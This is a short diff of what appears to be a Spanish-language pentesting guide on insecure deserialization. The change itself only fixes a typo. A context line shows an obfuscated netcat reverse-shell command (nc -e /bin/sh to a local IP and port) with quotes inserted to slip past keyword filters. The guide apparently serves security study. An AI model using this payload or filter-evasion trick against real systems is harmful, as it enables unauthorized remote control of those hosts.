@@ -33,7 +33,7 @@ Podríamos crear una clase que llame a reduce pidiendole que ejecute comandos en
 
 Podriamos encontrarnos tanto en blackbox como en whitebox que los objetos, al ser deserializados tengan filtros. Deberemos probar también medidas que permitan pasarlos. Ej:
 
-Agregar las comillas entre los datos que plausibles de ser eliminados por los filtos:
+Agregar las comillas entre los datos plausibles de ser eliminados por los filtos:
 
             n''c -nv 172.17.0.1 9999 -e /bin/s''h
 
